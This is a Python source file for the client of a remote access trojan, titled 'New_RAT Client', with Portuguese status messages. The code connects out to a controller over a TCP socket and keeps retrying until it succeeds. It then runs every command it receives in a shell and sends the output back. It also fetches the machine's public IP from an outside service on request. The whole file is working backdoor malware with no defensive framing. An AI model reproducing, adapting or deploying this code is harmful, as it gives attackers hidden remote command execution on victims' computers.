import socket
import subprocess
import requests
import ctypes
import time

# Set console so no Windows
try:
    if hasattr(ctypes, "windll"):
        ctypes.windll.user32.SetConsoleTitleW("New_RAT Client")
except AttributeError:
    pass  # Linux

def start_client(server_ip, server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            print(f"[*] Tentando conectar com: {server_ip}:{server_port}...")
            client.connect((server_ip, server_port))
            print("[+] Conectado!")
            break
        except (ConnectionRefusedError, OSError):
            print("[!] Conexao nao encontrada. Tentando dnv em 5 segundos...")
            time.sleep(5)  
    
    while True:
        try:
            command = client.recv(1024).decode()
            if not command:
                print("[!] Server desconectado.")
                break

            print(f"[+] Comando: {command}") 
            if command.lower() == "exit":
                print("[*] Saindo...")
                break

            if command.lower() == "getip":
                r = requests.get('https://api64.ipify.org?format=json')
                response = r.json()
                output = response['ip']
                client.send(output.encode())
                print(f"[+] IP: {output}")  # ✅ Debugging message
                continue

            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output

            client.send(output.encode())
            print(f"[*]{output}")  # ✅ Now prints output of the executed command
        
        except (ConnectionResetError, BrokenPipeError):
            print("[!] Conexao perdida. Saindo...")
            break

    client.close()

# Run the client
start_client("127.0.0.1", 5555)
